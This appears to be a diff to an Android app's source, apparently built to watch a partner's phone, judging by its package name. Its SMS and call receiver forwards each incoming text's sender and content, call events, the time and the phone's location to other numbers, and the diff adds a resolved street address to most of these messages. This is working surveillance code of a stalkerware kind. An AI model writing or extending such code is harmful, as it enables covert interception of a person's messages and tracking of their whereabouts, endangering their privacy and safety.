@@ -3,8 +3,8 @@ package com.Sven.CuckoldResister.CuckoldResister;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.location.Location;
 import android.os.Bundle;
-import android.telephony.PhoneStateListener;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
@@ -30,7 +30,7 @@ public class SmsForward extends BroadcastReceiver {
     private static Date callStartTime;
     private static boolean isIncoming;
     private static String savedNumber;  //because the passed incoming is only valid in ringing
-    private static List<String> address;
+    private static String address;
 
 
     @Override
@@ -97,6 +97,9 @@ public class SmsForward extends BroadcastReceiver {
         double[] dl = mainActivity.getGPS();
         Calendar cal = Calendar.getInstance();
         sdf = new SimpleDateFormat("HH:mm:ss");
+        Location location = mainActivity.getLocation();
+        address = mainActivity.getAddress();
+        Log.d("sven","SMSFORWARD: address:" + address);
 
         try {
             for (int i = 0; i < phoneList.size(); i++) {
@@ -104,7 +107,8 @@ public class SmsForward extends BroadcastReceiver {
                 Log.d("sven", "SMSFORWARD: all configure done, sending....");
                 smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + "[From Phone: " + _phoneNumber + "] "
                                 + "[Time: " + sdf.format(cal.getTime()) + "] "
-                                + "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
+                                //+ "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
+                                + "[Address:] " + address
                         , null, null);
 
                 smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + _message
@@ -125,6 +129,8 @@ public class SmsForward extends BroadcastReceiver {
         double[] dl = mainActivity.getGPS();
         Calendar cal = Calendar.getInstance();
         sdf = new SimpleDateFormat("HH:mm:ss");
+        Location location = mainActivity.getLocation();
+        address = mainActivity.getAddress();
 
         try {
             for (int i = 0; i < phoneList.size(); i++) {
@@ -133,7 +139,8 @@ public class SmsForward extends BroadcastReceiver {
                     case "INCOMING":
                         smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + "[INCOMING PHONE][From Phone: " + _phoneNumber + "] "
                                         + "[Time: " + sdf.format(cal.getTime()) + "] "
-                                        + "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
+                                        //+ "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
+                                        + "[Address:] " + address
                                 , null, null);
                         break;
 
@@ -141,13 +148,15 @@ public class SmsForward extends BroadcastReceiver {
                         smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + "[RINGING PHONE][From Phone: " + _phoneNumber + "] "
                                         + "[Time: " + sdf.format(cal.getTime()) + "] "
                                         + "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
+                                        + "[Address:] " + address
                                 , null, null);
                         break;
 
                     case "CALLEND":
                         smsManager.sendTextMessage(phoneList.get(i), null, "[Forward] " + "[CALL END][From Phone: " + _phoneNumber + "] "
                                         + "[Time: " + sdf.format(cal.getTime()) + "] "
-                                        + "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
+                                        //+ "[Location: Lat: " + dl[0] + ", Long: " + dl[1] + "] "
+                                        + "[Address:] " + address
                                 , null, null);
                         break;
 
